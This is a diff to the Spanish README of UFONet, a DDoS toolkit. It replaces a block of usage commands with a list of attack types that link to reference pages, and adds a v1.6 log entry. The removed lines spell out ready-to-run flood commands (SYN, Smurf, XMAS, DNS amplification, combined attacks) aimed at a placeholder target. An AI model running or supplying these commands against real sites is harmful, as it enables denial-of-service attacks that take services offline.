@@ -346,45 +346,29 @@ Puedes probar tu lista de zombies "X-RPCs" lanzando:
 
      ./ufonet --test-rpc
 
-Al mismo tiempo, puedes conectar LOIC (con soporte para proxy), para hacer un número determinado de peticiones 
-recursivas directamente sobre tu objetivo:
+###############################
+# Ataques Extra
+###############################
 
-     ./ufonet -a http://target.com --loic 100
+ - LOIC: https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon
+ - LORIS: https://en.wikipedia.org/wiki/Slowloris_(software)
+ - UFOSYN: https://en.wikipedia.org/wiki/SYN_flood
+ - FRAGGLE: https://en.wikipedia.org/wiki/Fraggle_attack
+ - UFORST: https://ddos-guard.net/en/terminology/attack_type/rst-or-fin-flood
+ - SPRAY: https://en.wikipedia.org/wiki/DRDOS
+ - SMURF: https://en.wikipedia.org/wiki/Smurf_attack
+ - XMAS: https://en.wikipedia.org/wiki/Christmas_tree_packet
+ - DROPER: https://en.wikipedia.org/wiki/IP_fragmentation_attack
+ - SNIPER: https://www.imperva.com/learn/application-security/snmp-reflection/
+ - TACHYON: https://www.us-cert.gov/ncas/alerts/TA13-088A
+ - PINGER: https://www.cloudflare.com/learning/ddos/ping-icmp-flood-ddos-attack/
+ - MONLIST: https://www.us-cert.gov/ncas/alerts/TA14-013A
+ - UFOACK: https://www.f5.com/services/resources/glossary/push-and-ack-flood
+ - OVERLAP: https://cyberhoot.com/cybrary/fragment-overlap-attack/
+ - UFOUDP: https://en.wikipedia.org/wiki/UDP_flood_attack
+ - NUKE: https://dl.packetstormsecurity.net/papers/general/tcp-starvation.pdf
 
-Puedes conectar LORIS para hacer peticiones que dejen hilos abiertos en tu objetivo, haciendo que el servidor web 
-se vuelva lento:
-
-     ./ufonet -a http://target.com --loris 100
-
-Y también puedes conectar UFOSYN (requiere acceso mediante 'root') para comenzar un poderoso ataque de inundación TCP/SYN:
-
-     sudo python ufonet -a http://target.com --ufosyn 100
-
-O hacer un ataque SPRAY ('root' requerido) para lanzar una Denegación de Servicio Distribuída y Reflejada (DrDoS):
-
-     sudo python ufonet -a http://target.com --spray 100
-
-Un ataque SMURF ('root' requerido) para enviar paquetes de 'Propagación' ICMP de manera distribuída:
-
-     sudo python ufonet -a http://target.com --smurf 101
-
-O un ataque XMAS ('root' requerido) que inundará tu objetivo con paquetes 'Árbol de Navidad':
-
-     sudo python ufonet -a http://target.com --xmas 101
-
-Un ataque STARVATION ('root' requerido) que tumbará tu objetivo en segundos, si éste no tiene un mínimo nivel de protección:
-
-     sudo python ufonet -a http://target.com --nuke 10000
-
-O un ataque TACHYON ('root' requerido) para realizar una amplificación distribuída del tráfico DNS:
-
-     sudo python ufonet -a http://target.com --tachyon 1000
-
-Todos los ataques pueden ser combinados haciendo que UFONet utilice distintas técnicas de DDoS y DoS, al mismo tiempo:
-
-     python ufonet -a http://target.com --loic 100 --loris 100
-
-     sudo python ufonet -a http://target.com --loic 100 --loris 100 --ufosyn 100 --spray 100 --smurf 101 --xmas 101 --nuke 10000 --tachyon 1000
+Todos los ataques pueden ser combinados haciendo que UFONet utilice distintas técnicas de DDoS y DoS, al mismo tiempo.
 
 ###############################
 # Actualizando
@@ -455,6 +439,10 @@ más algunas "extra":
 ###############################
 # Timelog
 ###############################
+
+--------------------------
+17.08.2020 : v.1.6
+--------------------------
 
 --------------------------
 08.06.2020 : v.1.5
